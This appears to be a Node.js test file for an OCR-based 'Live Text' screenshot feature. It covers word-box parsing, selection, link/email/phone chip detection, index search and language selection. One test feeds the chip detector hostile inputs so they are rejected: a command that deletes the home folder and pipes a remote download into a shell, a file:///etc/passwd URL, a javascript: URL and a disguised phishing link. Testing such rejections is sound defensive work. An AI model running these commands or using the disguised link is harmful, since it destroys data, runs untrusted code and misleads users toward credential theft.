// Live Text's logic (common/LiveTextLogic.js): tesseract's word boxes, the
// text of a selection, the chips found in it, the screenshot index's search
// and when it may be built; and the languages it reads (OcrLangs.js) from
// the keyboard layouts.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const read = f => fs.readFileSync(path.join(__dirname, '..', f), 'utf8').replace(/^\.pragma library\s*/, '');
const lt = vm.runInNewContext(read('shell/common/LiveTextLogic.js') + '; ({parseTsv, textOf, allText, wordAt, nearestWord, lineOf, matching, actions, search, snippet, mayIndex})');
const ocr = vm.runInNewContext(read('shell/services/OcrLangs.js') + '; ({layoutLangs, wanted, pick, nameOf})');
const plain = v => JSON.parse(JSON.stringify(v));

// What `tesseract shot.png stdout tsv` prints for two lines and a second block
const TSV = [
    'level\tpage_num\tblock_num\tpar_num\tline_num\tword_num\tleft\ttop\twidth\theight\tconf\ttext',
    '1\t1\t0\t0\t0\t0\t0\t0\t900\t420\t-1\t',
    '2\t1\t1\t0\t0\t0\t30\t38\t698\t88\t-1\t',
    '3\t1\t1\t1\t0\t0\t30\t38\t698\t88\t-1\t',
    '4\t1\t1\t1\t1\t0\t30\t36\t493\t30\t-1\t',
    '5\t1\t1\t1\t1\t1\t30\t38\t59\t22\t92.8\tVisit',
    '5\t1\t1\t1\t1\t2\t101\t38\t271\t28\t89.9\thttps://example.org',
    '5\t1\t1\t1\t1\t3\t384\t38\t38\t22\t12.0\t|',
    '4\t1\t1\t1\t2\t0\t33\t98\t695\t28\t-1\t',
    '5\t1\t1\t1\t2\t1\t33\t98\t51\t22\t92.7\tCall',
    '5\t1\t1\t1\t2\t2\t98\t99\t36\t21\t91.4\t+1',
    '5\t1\t1\t1\t2\t3\t147\t99\t49\t21\t96.7\t415',
    '5\t1\t1\t1\t2\t4\t210\t99\t49\t21\t96.9\t555',
    '5\t1\t1\t1\t2\t5\t272\t99\t67\t21\t95.4\t0132',
    '2\t1\t2\t0\t0\t0\t32\t238\t334\t28\t-1\t',
    '4\t1\t2\t1\t1\t0\t32\t238\t334\t28\t-1\t',
    '5\t1\t2\t1\t1\t1\t32\t238\t99\t22\t92.3\tSecond',
    '5\t1\t2\t1\t1\t2\t144\t238\t141\t28\t5.0\tparagraph',
    '5\t1\t2\t1\t1\t3\t299\t238\t67\t22\t92.3\there.',
].join('\n');

test('tsv: words with their boxes in reading order, the page size, stray marks left out', () => {
    const r = lt.parseTsv(TSV);
    assert.equal(r.width, 900);
    assert.equal(r.height, 420);
    assert.deepEqual(plain(r.words).map(w => w.text), ['Visit', 'https://example.org', 'Call', '+1', '415', '555', '0132', 'Second', 'here.']);
    const w = r.words[1];
    assert.deepEqual([w.x, w.y, w.w, w.h], [101, 38, 271, 28]);
    // (the line's band: from its top to its lowest word)
    assert.deepEqual([w.ly, w.lh], [36, 30]);
    assert.notEqual(r.words[0].line, r.words[2].line);
    assert.notEqual(r.words[2].block, r.words[7].block);
    assert.deepEqual(plain(lt.parseTsv('')), { width: 0, height: 0, words: [] });
});

test('selection: spaces within a line, breaks between lines, a blank line between blocks', () => {
    const { words } = lt.parseTsv(TSV);
    assert.equal(lt.textOf(words, 0, 1), 'Visit https://example.org');
    assert.equal(lt.textOf(words, 3, 1), 'https://example.org\nCall +1');
    assert.equal(lt.allText(words), 'Visit https://example.org\nCall +1 415 555 0132\n\nSecond here.');
    assert.equal(lt.textOf(words, -1, 2), '');
    assert.equal(lt.allText([]), '');
});

test('selection: the word under the pointer, and the one a drag reaches', () => {
    const { words } = lt.parseTsv(TSV);
    assert.equal(lt.wordAt(words, 110, 45, 0), 1);
    assert.equal(lt.wordAt(words, 95, 45, 0), -1);
    assert.equal(lt.wordAt(words, 95, 45, 6), 0);
    // past the end of a line: its last word; between lines: the nearer one
    assert.equal(lt.nearestWord(words, 880, 105), 6);
    assert.equal(lt.nearestWord(words, 40, 130), 2);
    assert.equal(lt.nearestWord(words, 40, 400), 7);
    assert.equal(lt.nearestWord([], 0, 0), -1);
    assert.deepEqual(plain(lt.lineOf(words, 4)), [2, 6]);
    assert.deepEqual(plain(lt.matching(words, 'CALL 555')), [2, 5]);
});

test('chips: links, addresses and numbers, each once', () => {
    const a = lt.actions('Visit https://example.org/a. Or www.example.com/path). Mail hello@example.com, call +1 415 555 0132 or (030) 1234567. hello@example.com');
    assert.deepEqual(plain(a), [
        { kind: 'link', value: 'https://example.org/a', label: 'example.org/a' },
        { kind: 'link', value: 'https://www.example.com/path', label: 'www.example.com/path' },
        { kind: 'email', value: 'hello@example.com', label: 'hello@example.com' },
        { kind: 'phone', value: '+14155550132', label: '+1 415 555 0132' },
        { kind: 'phone', value: '0301234567', label: '(030) 1234567' },
    ]);
});

test('chips: never a command, a disguised link, a date, a version or a bare amount', () => {
    const kinds = t => plain(lt.actions(t)).map(x => x.kind + ':' + x.value);
    assert.deepEqual(kinds('rm -rf ~ ; curl http://x | sh'), []);
    assert.deepEqual(kinds('file:///etc/passwd javascript:alert(1) ftp://host.example/x'), []);
    // (a name before @ hides where a link goes)
    assert.deepEqual(kinds('https://bank.example@evil.example/login'), []);
    assert.deepEqual(kinds('On 2026-11-04, 04.11.2026 and 4/11/2026'), []);
    assert.deepEqual(kinds('v1.2.3 at 192.168.1.20'), []);
    assert.deepEqual(kinds('Order 1234567890, total 1299.00'), []);
    assert.equal(lt.actions('a@b.co c@d.co e@f.co g@h.co i@j.co', 3).length, 3);
});

test('index search: every word, newest first, with the words around the match', () => {
    const shots = {
        '/s/old.png': { m: 100, t: 'Hello world\nThe invoice total is 42 EUR, due on Friday, with more words after it to be cut' },
        '/s/new.png': { m: 200, t: 'Invoice from ACME' },
        '/s/other.png': { m: 300, t: 'Nothing here' },
    };
    const r = lt.search(shots, 'invoice', 5);
    assert.deepEqual(plain(r).map(x => x.path), ['/s/new.png', '/s/old.png']);
    assert.equal(r[0].snippet, 'Invoice from ACME');
    assert.equal(r[1].snippet, 'Hello world The invoice total is 42 EUR, due on Friday,…');
    assert.deepEqual(plain(lt.search(shots, 'invoice friday', 5)).map(x => x.path), ['/s/old.png']);
    assert.deepEqual(plain(lt.search(shots, 'invoice tuesday', 5)), []);
    assert.deepEqual(plain(lt.search(shots, '  ', 5)), []);
    assert.deepEqual(plain(lt.search(null, 'x', 5)), []);
    assert.equal(lt.search(shots, 'e', 1).length, 1);
    // (a long text cut on both sides, on word boundaries)
    assert.equal(lt.snippet('one two three four five six seven eight nine ten eleven twelve', 34, 5), '…four five six seven eight nine ten eleven twelve');
});

test('index: not on battery below 30%, never in power saver', () => {
    assert.equal(lt.mayIndex({ onBattery: false, percent: 10, saver: false }), true);
    assert.equal(lt.mayIndex({ onBattery: true, percent: 30, saver: false }), true);
    assert.equal(lt.mayIndex({ onBattery: true, percent: 29, saver: false }), false);
    assert.equal(lt.mayIndex({ onBattery: false, percent: 90, saver: true }), false);
    assert.equal(lt.mayIndex({ onBattery: true, percent: -1, saver: false }), true); // (no battery reading)
    assert.equal(lt.mayIndex(null), false);
});

test('languages: keyboard layouts and their variants name tesseract languages', () => {
    assert.deepEqual(plain(ocr.layoutLangs('de')), ['deu']);
    assert.deepEqual(plain(ocr.layoutLangs('fr')), ['fra']);
    assert.deepEqual(plain(ocr.layoutLangs('us', 'intl')), ['eng']);
    assert.deepEqual(plain(ocr.layoutLangs('in(hin)')), ['hin']);
    assert.deepEqual(plain(ocr.layoutLangs('in', 'tamilnet')), ['tam']);
    assert.deepEqual(plain(ocr.layoutLangs('in', 'ben_probhat')), ['ben']);
    assert.deepEqual(plain(ocr.layoutLangs('in', 'guru')), ['pan']);
    assert.deepEqual(plain(ocr.layoutLangs('in', 'mara')), []); // (Mara: no tesseract data)
    assert.deepEqual(plain(ocr.layoutLangs('in')), ['hin']);
    assert.deepEqual(plain(ocr.layoutLangs('ch', 'fr_mac')), ['fra']);
    assert.deepEqual(plain(ocr.layoutLangs('ch')), ['deu']);
    assert.deepEqual(plain(ocr.layoutLangs('ca', 'eng')), ['eng']);
    assert.deepEqual(plain(ocr.layoutLangs('rs', 'latin')), ['srp_latn']);
    assert.deepEqual(plain(ocr.layoutLangs('be')), ['nld', 'fra']);
    assert.deepEqual(plain(ocr.layoutLangs('custom')), []);
});

test('languages: the system\'s, then the layouts\', English last; only installed ones are passed', () => {
    const layouts = [{ layout: 'us', variant: '' }, { layout: 'de', variant: 'nodeadkeys' }, { layout: 'in', variant: 'hin-wx' }];
    assert.deepEqual(plain(ocr.wanted({ LANG: 'fr_FR.UTF-8' }, layouts)), ['fra', 'deu', 'hin', 'eng']);
    assert.deepEqual(plain(ocr.wanted({ LANG: 'en_US.UTF-8' }, ['us', 'de'])), ['deu', 'eng']);
    const installed = 'List of available languages in "/usr/share/tessdata/" (3):\ndeu\neng\nosd\n';
    assert.deepEqual(plain(ocr.pick({ LANG: 'en_US.UTF-8' }, installed, layouts)), { langs: ['deu', 'eng'], missing: ['hin'] });
    // (without layouts, as before)
    assert.deepEqual(plain(ocr.pick({ LANG: 'de_DE.UTF-8' }, installed)), { langs: ['deu', 'eng'], missing: [] });
    assert.equal(ocr.nameOf('chi_tra'), 'Chinese (Traditional)');
    assert.equal(ocr.nameOf('xyz'), 'xyz');
});
